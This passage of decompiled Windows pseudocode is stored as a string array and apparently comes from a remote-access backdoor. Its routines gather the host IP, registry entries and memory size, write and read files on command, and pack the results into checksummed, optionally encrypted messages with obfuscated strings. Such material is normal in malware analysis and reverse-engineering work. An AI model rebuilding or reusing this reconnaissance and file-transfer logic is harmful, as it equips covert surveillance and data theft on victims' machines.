    "  {",
    "    lpMultiByteStr = (CHAR *)sub_62745B80(v2);",
    "    v4 = lpMultiByteStr;",
    "    if ( lpMultiByteStr )",
    "      WideCharToMultiByte(0xFDE9u, 0, lpWideCharStr, -1, lpMultiByteStr, cbMultiByte, 0, 0);",
    "  }",
    "  return v4;",
    "}",
    "",
    "",
    "WCHAR *__fastcall sub_62742640(const CHAR *lpMultiByteStr)",
    "{",
    "  int v2; // eax",
    "  int cchWideChar; // ebx",
    "  WCHAR *v4; // rsi",
    "  WCHAR *lpWideCharStr; // rax",
    "",
    "  v2 = MultiByteToWideChar(0xFDE9u, 0, lpMultiByteStr, -1, 0, 0);",
    "  cchWideChar = v2;",
    "  v4 = 0;",
    "  if ( v2 )",
    "  {",
    "    lpWideCharStr = (WCHAR *)sub_62745B80(2LL * v2 + 2);",
    "    v4 = lpWideCharStr;",
    "    if ( lpWideCharStr )",
    "      MultiByteToWideChar(0xFDE9u, 0, lpMultiByteStr, -1, lpWideCharStr, cchWideChar);",
    "  }",
    "  return v4;",
    "}",
    "",
    "",
    "CHAR *__fastcall sub_627426C0(LPCWCH lpWideCharStr)",
    "{",
    "  int v2; // eax",
    "  int cbMultiByte; // ebx",
    "  CHAR *v4; // rsi",
    "  CHAR *lpMultiByteStr; // rax",
    "",
    "  v2 = WideCharToMultiByte(1u, 0, lpWideCharStr, -1, 0, 0, 0, 0);",
    "  cbMultiByte = v2;",
    "  v4 = 0;",
    "  if ( v2 )",
    "  {",
    "    lpMultiByteStr = (CHAR *)sub_62745B80(v2);",
    "    v4 = lpMultiByteStr;",
    "    if ( lpMultiByteStr )",
    "      WideCharToMultiByte(1u, 0, lpWideCharStr, -1, lpMultiByteStr, cbMultiByte, 0, 0);",
    "  }",
    "  return v4;",
    "}",
    "",
    "",
    "WCHAR *__fastcall sub_62742760(const CHAR *lpMultiByteStr)",
    "{",
    "  int v2; // eax",
    "  int cchWideChar; // ebx",
    "  WCHAR *v4; // rsi",
    "  WCHAR *lpWideCharStr; // rax",
    "",
    "  v2 = MultiByteToWideChar(1u, 0, lpMultiByteStr, -1, 0, 0);",
    "  cchWideChar = v2;",
    "  v4 = 0;",
    "  if ( v2 )",
    "  {",
    "    lpWideCharStr = (WCHAR *)sub_62745B80(2LL * v2 + 2);",
    "    v4 = lpWideCharStr;",
    "    if ( lpWideCharStr )",
    "      MultiByteToWideChar(1u, 0, lpMultiByteStr, -1, lpWideCharStr, cchWideChar);",
    "  }",
    "  return v4;",
    "}",
    "",
    "",
    "_BYTE *__fastcall sub_62742820(__int64 a1)",
    "{",
    "  _BYTE *result; // rax",
    "  char v3; // cl",
    "  __int64 v4; // rdx",
    "  int i; // r8d",
    "  char v6; // cl",
    "  __int64 v7; // rdx",
    "",
    "  result = (_BYTE *)sub_62745B80(strlen((const char *)a1) + 1);",
    "  if ( result )",
    "  {",
    "    *result = 0;",
    "    v3 = *(_BYTE *)a1;",
    "    if ( *(_BYTE *)a1 != 34 )",
    "    {",
    "      v4 = 1;",
    "      for ( i = 0; v3; v3 = *(_BYTE *)(a1 + v4 - 1) )",
    "      {",
    "        result[v4 - 1] = v3;",
    "        i = v4++;",
    "      }",
    "      goto LABEL_5;",
    "    }",
    "    v6 = *(_BYTE *)(a1 + 1);",
    "    if ( !v6 || v6 == 34 )",
    "    {",
    "      i = 0;",
    "LABEL_5:",
    "      result[i] = 0;",
    "      return result;",
    "    }",
    "    v7 = 1;",
    "    while ( 1 )",
    "    {",
    "      result[v7 - 1] = v6;",
    "      i = v7;",
    "      v6 = *(_BYTE *)(a1 + v7++ + 1);",
    "      if ( !v6 )",
    "        break;",
    "      if ( v6 == 34 )",
    "        goto LABEL_5;",
    "    }",
    "    result[i] = 0;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "WCHAR *__fastcall sub_627428E0(_BYTE *a1, unsigned int a2)",
    "{",
    "  int v4; // eax",
    "  CHAR *v5; // rax",
    "  CHAR *v6; // rbx",
    "  WCHAR *v7; // rsi",
    "  int cchWideChar; // edi",
    "  WCHAR *lpWideCharStr; // rax",
    "",
    "  v4 = sub_62741510(a2);",
    "  v5 = (CHAR *)sub_62745B80(v4);",
    "  v6 = v5;",
    "  v7 = (WCHAR *)v5;",
    "  if ( v5 )",
    "  {",
    "    cchWideChar = (unsigned int)sub_62741530(v5, a1, a2);",
    "    lpWideCharStr = (WCHAR *)sub_62745B80(2LL * cchWideChar);",
    "    v7 = lpWideCharStr;",
    "    if ( lpWideCharStr )",
    "      MultiByteToWideChar(0, 0, v6, -1, lpWideCharStr, cchWideChar);",
    "    sub_62745BE0(v6);",
    "  }",
    "  return v7;",
    "}",
    "",
    "",
    "CHAR *__fastcall sub_62742960(",
    "        _DWORD *a1,",
    "        _DWORD *a2,",
    "        const WCHAR *a3,",
    "        const WCHAR *a4,",
    "        const WCHAR *lpWideCharStr,",
    "        const WCHAR *a6,",
    "        const WCHAR *a7,",
    "        const char *a8,",
    "        int a9,",
    "        unsigned int *a10)",
    "{",
    "  CHAR *v13; // rbx",
    "  CHAR *v14; // rsi",
    "  CHAR *v15; // rbp",
    "  CHAR *v16; // r12",
    "  CHAR *v17; // r14",
    "  __int64 v18; // rax",
    "  _DWORD *v19; // r13",
    "  unsigned int v20; // eax",
    "  unsigned int v21; // edi",
    "  unsigned int v22; // eax",
    "  unsigned int v23; // edi",
    "  unsigned int v24; // eax",
    "  unsigned int v25; // edi",
    "  unsigned int v26; // eax",
    "  unsigned int v27; // edi",
    "  unsigned int v28; // eax",
    "  unsigned int v29; // r15d",
    "  _BYTE v31[344]; // [rsp+20h] [rbp-158h] BYREF",
    "",
    "  v13 = sub_627425A0(a3);",
    "  v14 = v13;",
    "  if ( v13 )",
    "  {",
    "    v14 = sub_627425A0(a4);",
    "    if ( v14 )",
    "    {",
    "      v15 = sub_627425A0(lpWideCharStr);",
    "      if ( v15 )",
    "      {",
    "        v16 = sub_627425A0(a6);",
    "        if ( v16 )",
    "        {",
    "          v17 = sub_627425A0(a7);",
    "          if ( v17 )",
    "          {",
    "            v18 = sub_62745B80(0x800u);",
    "            v19 = (_DWORD *)v18;",
    "            if ( v18 )",
    "            {",
    "              *(_DWORD *)(v18 + 4) = *a1;",
    "              *(_DWORD *)(v18 + 8) = a1[1];",
    "              *(_DWORD *)(v18 + 12) = 1;",
    "              *(_DWORD *)(v18 + 16) = *a2;",
    "              *(_DWORD *)(v18 + 20) = a2[1];",
    "              *(_DWORD *)(v18 + 24) = a2[2];",
    "              *(_DWORD *)(v18 + 28) = a2[3];",
    "              v20 = (unsigned int)sub_62741530((_BYTE *)(v18 + 72), v13, strlen(v13));",
    "              v19[8] = 72;",
    "              v19[9] = v20;",
    "              v21 = ((v20 + 3) & 0xFFFFFFFC) + 72;",
    "              v22 = (unsigned int)sub_62741530((_BYTE *)v19 + v21, v14, strlen(v14));",
    "              v19[10] = v21;",
    "              v19[11] = v22;",
    "              v23 = v21 + ((v22 + 3) & 0xFFFFFFFC);",
    "              v24 = (unsigned int)sub_62741530((_BYTE *)v19 + v23, v15, strlen(v15));",
    "              v19[12] = v23;",
    "              v19[13] = v24;",
    "              v25 = v23 + ((v24 + 3) & 0xFFFFFFFC);",
    "              v26 = (unsigned int)sub_62741530((_BYTE *)v19 + v25, v16, strlen(v16));",
    "              v19[14] = v25;",
    "              v19[15] = v26;",
    "              v27 = v25 + ((v26 + 3) & 0xFFFFFFFC);",
    "              v28 = (unsigned int)sub_62741530((_BYTE *)v19 + v27, v17, strlen(v17));",
    "              v19[16] = v27;",
    "              v19[17] = v28;",
    "              v29 = ((v28 + 3) & 0xFFFFFFFC) + v27;",
    "              *v19 = sub_62741E70(v19 + 1, v29 - 4, 0);",
    "              if ( a9 )",
    "              {",
    "                sub_62745FF0(v31, a8, strlen(a8));",
    "                sub_62746060(v31, v19, v19, v29);",
    "              }",
    "              *a10 = v29;",
    "            }",
    "            sub_62745BE0(v17);",
    "            v17 = (CHAR *)v19;",
    "          }",
    "          sub_62745BE0(v16);",
    "          v16 = v17;",
    "        }",
    "        sub_62745BE0(v15);",
    "        v15 = v16;",
    "      }",
    "      sub_62745BE0(v14);",
    "      v14 = v15;",
    "    }",
    "    sub_62745BE0(v13);",
    "  }",
    "  return v14;",
    "}",
    "",
    "",
    "int __fastcall sub_62742C40(char *Destination)",
    "{",
    "  struct hostent *v2; // rax",
    "  struct in_addr h_name; // esi",
    "  char *v4; // rax",
    "  char name[80]; // [rsp+20h] [rbp-208h] BYREF",
    "  struct WSAData WSAData; // [rsp+70h] [rbp-1B8h] BYREF",
    "",
    "  LODWORD(v2) = WSAStartup(0x101u, &WSAData);",
    "  if ( !(_DWORD)v2 )",
    "  {",
    "    LODWORD(v2) = gethostname(name, 80);",
    "    if ( (_DWORD)v2 != -1 )",
    "    {",
    "      v2 = gethostbyname(name);",
    "      if ( v2 )",
    "      {",
    "        v2 = (struct hostent *)*v2->h_addr_list;",
    "        if ( v2 )",
    "        {",
    "          h_name = (struct in_addr)v2->h_name;",
    "          GetModuleHandleW(0);",
    "          v4 = inet_ntoa(h_name);",
    "          LODWORD(v2) = (unsigned int)strcpy(Destination, v4);",
    "        }",
    "      }",
    "    }",
    "  }",
    "  return (int)v2;",
    "}",
    "",
    "",
    "_DWORD *__fastcall sub_62742CD0(_DWORD *a1, int a2, const char *a3, int a4, _DWORD *a5)",
    "{",
    "  const WCHAR *v7; // rsi",
    "  DWORDLONG v8; // r14",
    "  CHAR *v9; // rsi",
    "  _DWORD *v10; // rbx",
    "  __int64 v11; // rax",
    "  unsigned int v12; // eax",
    "  unsigned int v13; // ebp",
    "  unsigned int v14; // eax",
    "  const WCHAR *v16; // r14",
    "  DWORD i; // ebx",
    "  _BYTE v18[264]; // [rsp+40h] [rbp-5E8h] BYREF",
    "  DWORD cbData; // [rsp+148h] [rbp-4E0h] BYREF",
    "  DWORD cchName; // [rsp+14Ch] [rbp-4DCh] BYREF",
    "  HKEY phkResult; // [rsp+150h] [rbp-4D8h] BYREF",
    "  HKEY hKey; // [rsp+158h] [rbp-4D0h] BYREF",
    "  struct _MEMORYSTATUSEX Buffer; // [rsp+160h] [rbp-4C8h] BYREF",
    "  WCHAR Data[264]; // [rsp+1A0h] [rbp-488h] BYREF",
    "  char Destination[32]; // [rsp+3B0h] [rbp-278h] BYREF",
    "  WCHAR Name[300]; // [rsp+3D0h] [rbp-258h] BYREF",
    "",
    "  Destination[0] = 0;",
    "  Data[0] = 0;",
    "  sub_62742C40(Destination);",
    "  v7 = (const WCHAR *)sub_62746BA0(&unk_6274B3D0);",
    "  if ( !RegOpenKeyExW(HKEY_LOCAL_MACHINE, v7, 0, 0x108u, &hKey) )",
    "  {",
    "    v16 = (const WCHAR *)sub_62746BA0(&unk_6274B438);",
    "    for ( i = 0; ; ++i )",
    "    {",
    "      wcscpy((wchar_t *)&cchName, L\"Ą\");",
    "      if ( RegEnumKeyExW(hKey, i, Name, &cchName, 0, 0, 0, 0) )",
    "        break;",
    "      if ( !RegOpenKeyExW(hKey, Name, 0, 0x101u, &phkResult) )",
    "      {",
    "        wcscpy((wchar_t *)&cbData, L\"Ą\");",
    "        if ( !RegQueryValueExW(phkResult, v16, 0, 0, (LPBYTE)Data, &cbData) )",
    "        {",
    "          *((_BYTE *)Data + cbData) = 0;",
    "          *((_BYTE *)Data + cbData + 1) = 0;",
    "          break;",
    "        }",
    "        RegCloseKey(phkResult);",
    "      }",
    "    }",
    "    sub_62746C30(v16);",
    "    RegCloseKey(hKey);",
    "  }",
    "  sub_62746C30(v7);",
    "  Buffer.dwLength = 64;",
    "  LODWORD(v8) = 0;",
    "  if ( GlobalMemoryStatusEx(&Buffer) )",
    "    v8 = Buffer.ullTotalPhys >> 20;",
    "  v9 = sub_627425A0(Data);",
    "  v10 = v9;",
    "  if ( v9 )",
    "  {",
    "    v11 = sub_62745B80(0x800u);",
    "    v10 = (_DWORD *)v11;",
    "    if ( v11 )",
    "    {",
    "      *(_DWORD *)(v11 + 4) = *a1;",
    "      *(_DWORD *)(v11 + 8) = a1[1];",
    "      *(_DWORD *)(v11 + 12) = 2;",
    "      *(_DWORD *)(v11 + 16) = 1;",
    "      *(_DWORD *)(v11 + 20) = a2;",
    "      v12 = (unsigned int)sub_62741530((_BYTE *)(v11 + 44), Destination, strlen(Destination));",
    "      v10[6] = 44;",
    "      v10[7] = v12;",
    "      v13 = ((v12 + 3) & 0xFFFFFFFC) + 44;",
    "      v14 = (unsigned int)sub_62741530((_BYTE *)v10 + v13, v9, strlen(v9));",
    "      v10[8] = v13;",
    "      v10[9] = v14;",
    "      v10[10] = v8;",
    "      cbData = ((v14 + 3) & 0xFFFFFFFC) + v13;",
    "      *v10 = sub_62741E70(v10 + 1, cbData - 4, 0);",
    "      if ( a4 )",
    "      {",
    "        sub_62745FF0(v18, a3, strlen(a3));",
    "        sub_62746060(v18, v10, v10, cbData);",
    "      }",
    "      *a5 = cbData;",
    "    }",
    "    sub_62745BE0(v9);",
    "  }",
    "  return v10;",
    "}",
    "",
    "",
    "_DWORD *__fastcall sub_62743070(_DWORD *a1, int a2, const char *a3, int a4, ULONG *a5)",
    "{",
    "  _DWORD *v9; // rsi",
    "  _DWORD *v10; // rbx",
    "  _DWORD *v11; // rax",
    "  ULONG Lo; // edi",
    "  unsigned int v13; // edi",
    "  _BYTE v15[268]; // [rsp+20h] [rbp-148h] BYREF",
    "  tagCY Size; // [rsp+12Ch] [rbp-3Ch] BYREF",
    "",
    "  v9 = (_DWORD *)sub_627460D0(&Size);",
    "  v10 = v9;",
    "  if ( v9 )",
    "  {",
    "    v11 = (_DWORD *)sub_62745B80(Size.Lo + 1024);",
    "    v10 = v11;",
    "    if ( v11 )",
    "    {",
    "      v11[1] = *a1;",
    "      v11[2] = a1[1];",
    "      v11[3] = 2;",
    "      v11[4] = 2;",
    "      v11[5] = a2;",
    "      Lo = Size.Lo;",
    "      memcpy(v11 + 8, v9, Size.Lo);",
    "      v10[6] = 32;",
    "      v10[7] = Lo;",
    "      v13 = (Lo + 3) & 0xFFFFFFFC;",
    "      Size.Lo = v13 + 32;",
    "      *v10 = sub_62741E70(v10 + 1, v13 + 28, 0);",
    "      if ( a4 )",
    "      {",
    "        GetModuleHandleW(0);",
    "        sub_62745FF0(v15, a3, strlen(a3));",
    "        sub_62746060(v15, v10, v10, Size.Lo);",
    "      }",
    "      *a5 = Size.Lo;",
    "    }",
    "    sub_62745BE0(v9);",
    "  }",
    "  return v10;",
    "}",
    "",
    "",
    "char *__fastcall sub_627431B0(_DWORD *a1)",
    "{",
    "  const WCHAR *v1; // r15",
    "  char *v2; // rsi",
    "  char *v3; // rax",
    "  const WCHAR *v4; // r14",
    "  DWORD i; // ebx",
    "  CHAR *v7; // r13",
    "  CHAR *v8; // r13",
    "  CHAR *v9; // r13",
    "  char *v10; // [rsp+40h] [rbp-5C8h]",
    "  const WCHAR *lpValueName; // [rsp+48h] [rbp-5C0h]",
    "  const WCHAR *v12; // [rsp+50h] [rbp-5B8h]",
    "  char *v13; // [rsp+58h] [rbp-5B0h]",
    "  DWORD cbData; // [rsp+78h] [rbp-590h] BYREF",
    "  DWORD cchName; // [rsp+7Ch] [rbp-58Ch] BYREF",
    "  HKEY phkResult; // [rsp+80h] [rbp-588h] BYREF",
    "  HKEY hKey; // [rsp+88h] [rbp-580h] BYREF",
    "  char Source[272]; // [rsp+90h] [rbp-578h] BYREF",
    "  WCHAR Data[264]; // [rsp+1A0h] [rbp-468h] BYREF",
    "  WCHAR Name[300]; // [rsp+3B0h] [rbp-258h] BYREF",
    "",
    "  v1 = (const WCHAR *)sub_62746BA0(&unk_6274B468);",
    "  v2 = 0;",
    "  if ( !RegOpenKeyExW(HKEY_LOCAL_MACHINE, v1, 0, 0x108u, &hKey) )",
    "  {",
    "    v3 = (char *)sub_62745B80(0x40000u);",
    "    v2 = v3;",
    "    if ( v3 )",
    "    {",
    "      *v3 = 0;",
    "      v4 = (const WCHAR *)sub_62746BA0(&unk_6274B4D8);",
    "      lpValueName = (const WCHAR *)sub_62746BA0(&unk_6274B4F8);",
    "      v12 = (const WCHAR *)sub_62746BA0(&unk_6274B520);",
    "      v10 = (char *)sub_62746B10(&unk_6274B53F);",
    "      v13 = (char *)sub_62746B10(&unk_6274B549);",
    "      for ( i = 0; ; ++i )",
    "      {",
    "        wcscpy((wchar_t *)&cchName, L\"Ą\");",
    "        if ( RegEnumKeyExW(hKey, i, Name, &cchName, 0, 0, 0, 0) )",
    "          break;",
    "        if ( !RegOpenKeyExW(hKey, Name, 0, 0x101u, &phkResult) )",
    "        {",
    "          wcscpy((wchar_t *)&cbData, L\"Ą\");",
    "          if ( !RegQueryValueExW(phkResult, v4, 0, 0, (LPBYTE)Data, &cbData) )",
    "          {",
    "            *((_BYTE *)Data + cbData) = 0;",
    "            *((_BYTE *)Data + cbData + 1) = 0;",
    "            v7 = sub_627425A0(Data);",
    "            if ( v7 )",
    "            {",
    "              if ( *v2 && i )",
    "                strcat(v2, v10);",
    "              sub_62741530(Source, v7, strlen(v7));",
    "              strcat(v2, Source);",
    "              sub_62745BE0(v7);",
    "            }",
    "            wcscpy((wchar_t *)&cbData, L\"Ą\");",
    "            if ( RegQueryValueExW(phkResult, lpValueName, 0, 0, (LPBYTE)Data, &cbData) )",
    "            {",
    "              strcat(v2, v10);",
    "              strcat(v2, v13);",
    "            }",
    "            else",
    "            {",
    "              *((_BYTE *)Data + cbData) = 0;",
    "              *((_BYTE *)Data + cbData + 1) = 0;",
    "              v9 = sub_627425A0(Data);",
    "              if ( v9 )",
    "              {",
    "                strcat(v2, v10);",
    "                sub_62741530(Source, v9, strlen(v9));",
    "                strcat(v2, Source);",
    "                sub_62745BE0(v9);",
    "              }",
    "            }",
    "            wcscpy((wchar_t *)&cbData, L\"Ą\");",
    "            if ( RegQueryValueExW(phkResult, v12, 0, 0, (LPBYTE)Data, &cbData) )",
    "            {",
    "              strcat(v2, v10);",
    "              strcat(v2, v13);",
    "            }",
    "            else",
    "            {",
    "              *((_BYTE *)Data + cbData) = 0;",
    "              *((_BYTE *)Data + cbData + 1) = 0;",
    "              v8 = sub_627425A0(Data);",
    "              if ( v8 )",
    "              {",
    "                strcat(v2, v10);",
    "                sub_62741530(Source, v8, strlen(v8));",
    "                strcat(v2, Source);",
    "                sub_62745BE0(v8);",
    "              }",
    "            }",
    "          }",
    "          RegCloseKey(phkResult);",
    "        }",
    "      }",
    "      *a1 = strlen(v2) + 1;",
    "      sub_62746C30(v13);",
    "      sub_62746C30(v10);",
    "      sub_62746C30(v12);",
    "      sub_62746C30(lpValueName);",
    "      sub_62746C30(v4);",
    "    }",
    "    RegCloseKey(hKey);",
    "  }",
    "  sub_62746C30(v1);",
    "  return v2;",
    "}",
    "",
    "",
    "char *__fastcall sub_62743670(_DWORD *a1, int a2, const char *a3, int a4, _DWORD *a5)",
    "{",
    "  char *v9; // rsi",
    "  char *v10; // rbx",
    "  char *v11; // rax",
    "  int v12; // edi",
    "  unsigned int v13; // edi",
    "  _BYTE v15[268]; // [rsp+20h] [rbp-148h] BYREF",
    "  size_t Size[7]; // [rsp+12Ch] [rbp-3Ch] BYREF",
    "",
    "  v9 = sub_627431B0(Size);",
    "  v10 = v9;",
    "  if ( v9 )",
    "  {",
    "    v11 = (char *)sub_62745B80((unsigned int)(LODWORD(Size[0]) + 1024));",
    "    v10 = v11;",
    "    if ( v11 )",
    "    {",
    "      *((_DWORD *)v11 + 1) = *a1;",
    "      *((_DWORD *)v11 + 2) = a1[1];",
    "      *((_DWORD *)v11 + 3) = 2;",
    "      *((_DWORD *)v11 + 4) = 3;",
    "      *((_DWORD *)v11 + 5) = a2;",
    "      v12 = Size[0];",
    "      memcpy(v11 + 32, v9, LODWORD(Size[0]));",
    "      *((_DWORD *)v10 + 6) = 32;",
    "      *((_DWORD *)v10 + 7) = v12;",
    "      v13 = (v12 + 3) & 0xFFFFFFFC;",
    "      LODWORD(Size[0]) = v13 + 32;",
    "      *(_DWORD *)v10 = sub_62741E70(v10 + 4, v13 + 28, 0);",
    "      if ( a4 )",
    "      {",
    "        sub_62745FF0(v15, a3, strlen(a3));",
    "        sub_62746060(v15, v10, v10, LODWORD(Size[0]));",
    "      }",
    "      *a5 = Size[0];",
    "    }",
    "    sub_62745BE0(v9);",
    "  }",
    "  return v10;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_627437A0(__int64 a1, const void *a2, DWORD a3)",
    "{",
    "  const CHAR *v5; // rax",
    "  CHAR *v6; // rbx",
    "  unsigned int v7; // esi",
    "  WCHAR *v8; // rax",
    "  WCHAR *v9; // rdi",
    "  HANDLE FileW; // rax",
    "  void *v11; // r13",
    "  DWORD NumberOfBytesWritten; // [rsp+4Ch] [rbp-3Ch] BYREF",
    "",
    "  v5 = sub_62742820(a1);",
    "  v6 = (CHAR *)v5;",
    "  v7 = 0;",
    "  if ( v5 )",
    "  {",
    "    v8 = sub_62742640(v5);",
    "    v9 = v8;",
    "    if ( v8 )",
    "    {",
    "      FileW = CreateFileW(v8, 0x40000000u, 0, 0, 2u, 0x80u, 0);",
    "      v11 = FileW;",
    "      if ( FileW != (HANDLE)-1LL )",
    "      {",
    "        SetFilePointer(FileW, 0, 0, 0);",
    "        v7 = WriteFile(v11, a2, a3, &NumberOfBytesWritten, 0);",
    "        if ( v7 )",
    "          v7 = NumberOfBytesWritten == a3;",
    "        CloseHandle(v11);",
    "      }",
    "      sub_62745BE0(v9);",
    "    }",
    "    sub_62745BE0(v6);",
    "  }",
    "  return v7;",
    "}",
    "",
    "",
    "_DWORD *__fastcall sub_62743890(",
    "        _DWORD *a1,",
    "        int a2,",
    "        __int64 a3,",
    "        const void *a4,",
    "        DWORD a5,",
    "        const char *a6,",
    "        int a7,",
    "        unsigned int *a8)",
    "{",
    "  int v10; // edi",
    "  _DWORD *v11; // rax",
    "  _DWORD *v12; // rbx",
    "  char *v13; // rbp",
    "  unsigned int v14; // esi",
    "  unsigned int v15; // esi",
    "  unsigned int v16; // ebp",
    "  _BYTE v18[312]; // [rsp+20h] [rbp-138h] BYREF",
    "",
    "  v10 = sub_627437A0(a3, a4, a5);",
    "  v11 = (_DWORD *)sub_62745B80(0x400u);",
    "  v12 = v11;",
    "  if ( v11 )",
    "  {",
    "    v11[1] = *a1;",
    "    v11[2] = a1[1];",
    "    v11[3] = 2;",
    "    v11[4] = 5;",
    "    v11[5] = a2;",
    "    if ( v10 )",
    "      v13 = (char *)sub_62746B10(&unk_6274B553);",
    "    else",
    "      v13 = (char *)sub_62746B10(&unk_6274B560);",
    "    v14 = (unsigned int)sub_62741530((_BYTE *)v12 + 32, v13, strlen(v13));",
    "    sub_62746C30(v13);",
    "    v12[6] = 32;",
    "    v12[7] = v14;",
    "    v15 = (v14 + 3) & 0xFFFFFFFC;",
    "    v16 = v15 + 32;",
    "    *v12 = sub_62741E70(v12 + 1, v15 + 28, 0);",
    "    if ( a7 )",
    "    {",
    "      sub_62745FF0(v18, a6, strlen(a6));",
    "      sub_62746060(v18, v12, v12, v16);",
    "    }",
    "    *a8 = v16;",
    "  }",
    "  return v12;",
    "}",
    "",
    "",
    "void *__fastcall sub_627439E0(__int64 a1, DWORD *a2)",
    "{",
    "  const CHAR *v3; // rax",
    "  CHAR *v4; // rbx",
    "  void *v5; // rsi",
    "  WCHAR *v6; // rax",
    "  HANDLE FileW; // rax",
    "  void *v8; // rdi",
    "  void *v9; // r12",
    "  DWORD v10; // eax",
    "  DWORD v11; // r13d",
    "  DWORD NumberOfBytesRead; // [rsp+4Ch] [rbp-3Ch] BYREF",
    "",
    "  v3 = sub_62742820(a1);",
    "  v4 = (CHAR *)v3;",
    "  v5 = (void *)v3;",
    "  if ( v3 )",
    "  {",
    "    v6 = sub_62742640(v3);",
    "    v5 = v6;",
    "    if ( v6 )",
    "    {",
    "      FileW = CreateFileW(v6, 0x80000000, 7u, 0, 3u, 0x80u, 0);",
    "      v8 = FileW;",
    "      v9 = 0;",
    "      if ( FileW != (HANDLE)-1LL )",
    "      {",
    "        v10 = SetFilePointer(FileW, 0, 0, 2u);",
    "        v11 = v10;",
    "        if ( v10 <= 0x40000000 )",
    "        {",
    "          v9 = (void *)sub_62745B80(v10);",
    "          if ( v9 )",
    "          {",
    "            SetFilePointer(v8, 0, 0, 0);",
    "            if ( ReadFile(v8, v9, v11, &NumberOfBytesRead, 0) && NumberOfBytesRead == v11 )",
    "            {",
    "              if ( a2 )",
    "                *a2 = v11;",
    "            }",
    "            else",
    "            {",
    "              sub_62745BE0(v9);",
    "              v9 = 0;",
    "            }",
    "          }",
    "        }",
    "        CloseHandle(v8);",
    "      }",
    "      sub_62745BE0(v5);",
    "      v5 = v9;",
    "    }",
    "    sub_62745BE0(v4);",
    "  }",
    "  return v5;",
    "}",
    "",
    "",
    "_DWORD *__fastcall sub_62743B20(_DWORD *a1, int a2, __int64 a3, const char *a4, int a5, unsigned int *a6)",
    "{",
    "  void *v9; // rbp",
    "  _DWORD *v10; // rax",
    "  _DWORD *v11; // rbx",
    "  char *v12; // r13",
    "  unsigned int v13; // esi",
    "  unsigned int v14; // esi",
    "  int v15; // edi",
    "  unsigned int v16; // esi",
    "  char *v18; // r13",
    "  unsigned int v19; // esi",
    "  _BYTE v20[268]; // [rsp+20h] [rbp-148h] BYREF",
    "  size_t Size[7]; // [rsp+12Ch] [rbp-3Ch] BYREF",
    "",
    "  LODWORD(Size[0]) = 0;",
    "  v9 = sub_627439E0(a3, (DWORD *)Size);",
    "  v10 = (_DWORD *)sub_62745B80((unsigned int)(LODWORD(Size[0]) + 1024));",
    "  v11 = v10;",
    "  if ( v10 )",
    "  {",
    "    v10[1] = *a1;",
    "    v10[2] = a1[1];",
    "    v10[3] = 2;",
    "    v10[4] = 6;",
    "    v10[5] = a2;",
    "    if ( v9 )",
    "    {",
    "      v12 = (char *)sub_62746B10(&unk_6274B581);",
    "      v13 = (unsigned int)sub_62741530((_BYTE *)v11 + 40, v12, strlen(v12));",
    "      sub_62746C30(v12);",
    "      v11[6] = 40;",
    "      v11[7] = v13;",
    "      v14 = ((v13 + 3) & 0xFFFFFFFC) + 40;",
    "      v15 = Size[0];",
    "      memcpy((char *)v11 + v14, v9, LODWORD(Size[0]));",
    "      v11[8] = v14;",
    "      v11[9] = v15;",
    "    }",
    "    else",
    "    {",
    "      v18 = (char *)sub_62746B10(&unk_6274B5A0);",
    "      v19 = (unsigned int)sub_62741530((_BYTE *)v11 + 40, v18, strlen(v18));",
    "      sub_62746C30(v18);",
    "      v11[6] = 40;",
    "      v11[7] = v19;",
    "      v14 = ((v19 + 3) & 0xFFFFFFFC) + 40;",
    "      v15 = Size[0];",
    "      v11[8] = 0;",
    "      v11[9] = 0;",
    "    }",
    "    v16 = ((v15 + 3) & 0xFFFFFFFC) + v14;",
    "    *v11 = sub_62741E70(v11 + 1, v16 - 4, 0);",
    "    if ( a5 )",
    "    {",
    "      sub_62745FF0(v20, a4, strlen(a4));",
    "      sub_62746060(v20, v11, v11, v16);",
    "    }",
    "    *a6 = v16;",
    "  }",
    "  if ( v9 )",
    "    sub_62745BE0(v9);",
    "  return v11;",
    "}",
    "",
    "",
    "__int64 sub_62743D10()",
    "{",
    "  const wchar_t *v0; // rbx",
    "  const wchar_t *v2; // rdi",
    "  unsigned int v3; // esi",
    "  const wchar_t *v4; // rbx",
    "  unsigned __int64 v5; // rdx",
    "  __int64 v6; // rax",
    "  __int64 v7; // rcx",
    "  __int64 v8; // r8",
    "  int v9; // ecx",
    "  wchar_t v10; // dx",
    "  __int64 v11; // rax",
    "  wchar_t String[276]; // [rsp+20h] [rbp-228h] BYREF",
    "",
    "  v0 = (const wchar_t *)((__int64 (*)(void))sub_627427E0)();",
    "  if ( wcslen(v0) <= 1 )",
    "    return 0;",
    "  v2 = (const wchar_t *)sub_62746BA0(&unk_6274B5C0);",
    "  v3 = wcsnicmp(v0, v2, 2u);",
    "  if ( !v3 )",
    "  {",
    "    v4 = (const wchar_t *)sub_627427E0(v0 + 2);",
    "    if ( !wcslen(v4) )",
    "      goto LABEL_5;",
    "    String[0] = 0;",
    "    v5 = *v4;",
    "    if ( (_WORD)v5 == 34 )",
    "    {",
    "      v10 = v4[1];",
    "      if ( !v10 || v10 == 34 )",
    "      {",
    "        v9 = v3;",
    "      }",
    "      else",
    "      {",
    "        v11 = 1;",
    "        do",
    "        {",
    "          String[v11 - 1] = v10;",
    "          v9 = v11;",
    "          v10 = v4[++v11];",
    "        }",
    "        while ( v10 && v10 != 34 );",
    "      }",
    "    }",
    "    else",
    "    {",
    "      if ( (unsigned __int16)v5 > 0x20u )",
    "      {",
    "        v6 = 1;",
    "LABEL_10:",
    "        v8 = 0x100002601LL;",
    "        do",
    "        {",
    "          while ( 1 )",
    "          {",
    "            String[v6 - 1] = v5;",
    "            v9 = v6;",
    "            v5 = v4[v6];",
    "            if ( (unsigned __int16)v5 <= 0x20u )",
    "              break;",
    "            ++v6;",
    "          }",
    "          ++v6;",
    "        }",
    "        while ( !_bittest64(&v8, v5) );",
    "        goto LABEL_13;",
    "      }",
    "      v6 = 1;",
    "      v7 = 0x100002601LL;",
    "      if ( !_bittest64(&v7, v5) )",
    "        goto LABEL_10;",
    "      v9 = v3;",
    "    }",
    "LABEL_13:",
    "    String[v9] = 0;",
    "    if ( wcslen(String) )",
    "      v3 = SetCurrentDirectoryW(String);",
    "    goto LABEL_5;",
    "  }",
    "  v3 = 0;",
    "LABEL_5:",
    "  sub_62746C30(v2);",
    "  return v3;",
    "}",
    "",
    "",
    "WCHAR *__fastcall sub_62743EA0(_DWORD *a1, int a2, const CHAR *a3, const char *a4, int a5, _DWORD *a6)",
    "{",
    "  WCHAR *v9; // rbx",
